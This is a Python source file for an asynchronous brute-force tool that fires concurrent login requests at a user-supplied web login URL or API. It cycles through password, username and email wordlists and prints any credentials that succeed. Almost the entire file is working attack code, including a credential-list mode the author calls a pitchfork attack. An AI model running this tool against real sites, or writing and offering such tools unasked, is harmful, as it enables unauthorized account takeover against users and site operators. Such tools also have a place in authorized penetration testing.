import asyncio
import httpx
import aiofiles
import os

from .Options import headers, get_body  # Assuming 'Options' contains necessary headers

async def try_login(client, url, data):
    """Sends a login request and returns the response."""
    return await client.post(url, headers=headers, data=data)

async def load_file(filename):
    """Loads lines from a file and returns a list of strings."""
    try:
        async with aiofiles.open(filename, "r", encoding="latin-1") as file:
            lista = [line.strip() for line in await file.readlines()]
            return lista  # Return the list of passwords
    except FileNotFoundError:
        print(f"Error: The file {filename} does not exist.")
        return []

async def attempt_login(client, url, data, response_success, response_failure):
    """Attempts to log in with an identifier and password."""
    response = await try_login(client, url, data)

    # Check if the status code indicates a successful login
    if response.status_code in [200, 201, 204, 302]:
        # Check if the response contains the success or failure text
        if response_success in response.text or response_failure not in response.text:
            return True
        elif response_failure in response.text:
            print(f"Login failed: {response.text}")  # Message for failed login
            return False
        else:
            print(f"Login not recognized: {response.text}")  # Message if response is not recognized
            return False
    else:
        print(f"Login error: {response.status_code} - {response.text}")  # Message for status error
        return False

async def login_with_provided_credentials(client, url, identifier, data, password, is_email, response_success, response_failure):
    """Logs in with credentials provided by the user."""
    success = await attempt_login(client, url, data, response_success, response_failure)
    if success:
        print(f"Login successful with {'email' if is_email else 'username'}: {identifier} and password: {password}")
    return success

async def login_with_file_credentials(client, url, identifier, passwords, is_email, semaphore, response_success, response_failure):
    """Logs in with all passwords from a file."""
    async with semaphore:  # Limit access to 10 tasks
        for password in passwords:
            data = {'password': password}
            if is_email:
                data['email'] = identifier
            else:
                data['username'] = identifier

            success = await attempt_login(client, url, data, response_success, response_failure)
            if success:
                print(f"Login successful with {'email' if is_email else 'username'}: {identifier} and password: {password}")
                return True
    return False

async def startCredBruteForce():
    filename = "./BruteForceWebLogin/usernames.txt"
    if not os.path.isfile(filename):
        print(f"The file {filename} does not exist in the current directory.")
        return

    """Main function to handle the login."""
    url = input("Enter the login URL/API: ")
    
    # Ask if using the default body
    use_default_body = input("Do you want to use the default body structure? (y/n): ").lower() == 'y'
    login_type = input("Do you want to log in with (1) Email or (2) Username? ")
    
    is_email = login_type == '1'
    identifier = input(f"Enter your {'email address' if is_email else 'username'}: ")
    has_password = input("Do you have a password? (y/n): ").lower() == 'y'

    # Data structure for the request
    if use_default_body:
        # Use the get_body method to get the default body
        data = get_body()

        # Update the body with the identifier and password
        if is_email:
            data["email"] = identifier
        else:
            data["username"] = identifier

        if has_password:
            data["password"] = input("Enter your password: ")
        else:
            passwords = await load_file("./BruteForceWebLogin/passwords.txt")
            if not passwords:
                print("The password file is empty.")
                return
    else:
        # Allow the user to manually enter the body structure
        body_struct = input("Enter the body structure (e.g., user=username&pass=password&restofvariables=value): ")
        
        # Parsing the input structure
        data = {}
        for pair in body_struct.split('&'):
            key, value = pair.split('=')
            data[key] = value

    # Read response values
    response_success = input("Enter the success response string: ") or "success"
    response_failure = input("Enter the failure response string: ") or "invalid"

    # Ask for the number of threads
    while True:
        thread_input = input("Enter the number of threads (press Enter for default: 3): ")
        
        # Use default value if input is empty
        if thread_input.strip() == "":
            thread_number = 3
            break
        
        # Try to convert input to an integer
        try:
            thread_number = int(thread_input)
            if thread_number <= 0:  # Ensure the number is positive
                print("Please enter a positive integer. Using default value 3.")
                thread_number = 3
                break
            break  # Exit the loop if input is valid
        except ValueError:
            print("Invalid input. Please enter a valid integer.")

    # Execute the request with the provided credentials
    async with httpx.AsyncClient() as client:
        # Case where the user inputs email/username and password
        if identifier and has_password:
            await login_with_provided_credentials(client, url, identifier, data, data["password"], is_email, response_success, response_failure)

        # Case where the user inputs only email/username (brute force password only)
        elif not has_password:
            passwords = await load_file("./BruteForceWebLogin/passwords.txt")
            if not passwords:
                print("The password file is empty.")
                return
            semaphore = asyncio.Semaphore(thread_number)  # Maximum of 10 simultaneous tasks
            tasks = []
            tasks.append(login_with_file_credentials(client, url, identifier, passwords, is_email, semaphore, response_success, response_failure))
            results = await asyncio.gather(*tasks)
            if any(results):
                print("At least one login was successful.")
        
        # Case where the user does not know either email/username or password (pitchfork attack)
        else:
            passwords = await load_file("./BruteForceWebLogin/passwords.txt")
            if not passwords:
                print("The password file is empty.")
                return
            
            semaphore = asyncio.Semaphore(thread_number)  # Maximum of 10 simultaneous tasks
            tasks = []
            # Load emails
            if is_email:
                emails = await load_file("./BruteForceWebLogin/mail.txt")
                for email in emails:
                    tasks.append(login_with_file_credentials(client, url, email, passwords, is_email, semaphore, response_success, response_failure))
            # Load usernames
            else:
                usernames = await load_file("./BruteForceWebLogin/usernames.txt")
                for username in usernames:
                    tasks.append(login_with_file_credentials(client, url, username, passwords, is_email, semaphore, response_success, response_failure))

            # Wait for all tasks to complete
            results = await asyncio.gather(*tasks)
            if any(results):
                print("At least one login was successful.")
